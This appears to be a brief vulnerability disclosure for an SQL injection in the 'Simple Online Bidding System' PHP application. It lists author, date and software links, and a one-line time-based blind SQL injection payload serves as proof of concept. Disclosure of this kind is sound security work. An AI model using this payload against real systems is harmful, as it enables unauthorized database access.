# Simple Online Bidding System

**Exploit Title: Simple Online Bidding System SQL** Injection

**Date**: 4/08/2023

**Exploit Author:** y3thu

**Vendor Homepage:** [https://www.sourcecodester.com/users/tips23](https://www.sourcecodester.com/users/tips23)

**Software Link:** [https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html](https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html)

**Attack Vector:** WEB, Network

**Testeted on:** Kali Linux

**POC**

- **payload:**   AND (SELECT 5294 FROM (SELECT(SLEEP(5)))bgxK)
    
    !![Untitled 1](https://github.com/yethu123/vulns-finding/assets/29069905/c3e4aeb2-12c9-4f88-a72a-80f972f98a63)

    
    !![Untitled](https://github.com/yethu123/vulns-finding/assets/29069905/f529e593-a403-4dda-a57e-c481609b74a2)
